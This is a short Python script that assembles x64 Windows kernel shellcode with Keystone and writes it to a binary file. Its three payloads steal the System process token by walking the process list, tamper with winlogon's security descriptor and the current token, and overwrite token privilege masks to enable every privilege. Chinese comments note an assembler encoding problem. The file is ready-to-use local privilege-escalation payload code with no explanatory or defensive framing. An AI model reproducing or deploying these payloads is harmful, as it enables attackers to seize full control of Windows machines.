#coding:utf-8 

import keystone as k

CODE = """
mov r9, qword ptr[r9+0x220]  
mov r8, [r9+0x3e8]               
mov rax, r9                     
loop1:
  mov rax,qword ptr [rax + 0x2f0]         
  sub rax, 0x2f0                 
  cmp [rax + 0x2e8],r8           
  jne loop1                      
mov rdx,rax
add rdx,0x360 
mov rax,r9
loop2:  
	mov rax,qword ptr [rax + 0x2f0]       
	sub rax, 0x2f0                
	cmp  byte ptr [rax + 0x2e8],4  
    jne loop2
mov rcx,rax 
add rcx,0x360 
mov rbx, [rcx]  
mov [rdx],rbx 
ret
"""


'''
mov r9,qword ptr gs:[0x188] capstone支持的不好，汇编出来的是不对的
不要问我为什么，我也想知道为什么 .....
有时间了去看看keystone的源代码了，看能不能修
'''


CODE = """
mov rax,r9
mov rax,qword ptr [rax+0x220]                 
mov rcx, rax                         
mov rax,qword ptr [rax+0x2f0]                 
procloop:
  lea rbx, [rax-0x2f0]               
  mov rax,qword ptr [rax]                     
  add rbx, 0x450                     
  cmp dword ptr [rbx], 0x6c6e6977        
  jne procloop                       
sub rbx, 0x450                       
sub rbx, 0x30                        
add rbx, 0x28                        
mov rax, qword ptr [rbx]                       
and rax, 0x0FFFFFFFFFFFFFFF0         
add rax, 0x48                        
mov byte ptr [rax], 0x0b                 
add rcx, 0x360                       
mov rax, qword ptr [rcx]                       
and rax, 0x0FFFFFFFFFFFFFFF0         
add rax, 0x0d4                       
mov byte ptr [rax], 0                    
ret
"""

CODE =  """                 
mov r9,qword ptr [r9+0x220]                  
mov rcx, r9                                  
add rcx, 0x360                               
mov rax,qword ptr [rcx]                      
and rax, 0xFFFFFFFFFFFFFFF0                  
mov r8,  0x1ff2ffffbc                        
mov qword ptr [rax+0x40],r8                  
mov qword ptr [rax+0x48],r8                  
ret
"""

try:

    ks = k.Ks(k.KS_ARCH_X86, k.KS_MODE_64)
    encoding, count = ks.asm(CODE)
    '''
       补充 mov r9,qword ptr gs:[0x188] 的的操作码
    '''
    read_gs = [ 0x65 ,0x4C, 0x8B ,0x0C,0x25, 0x88 ,0x01 ,0x00 ,0x00 ]
    encoding = read_gs + encoding
    print(encoding)
    # print("%s = %s (number of statements: %u)" %(CODE, encoding, count))
    with open("shellcode.bin","wb") as fd:
        fd.write( bytes( encoding ) )
except k.KsError  as e:
    print("ERROR: %s" %e)

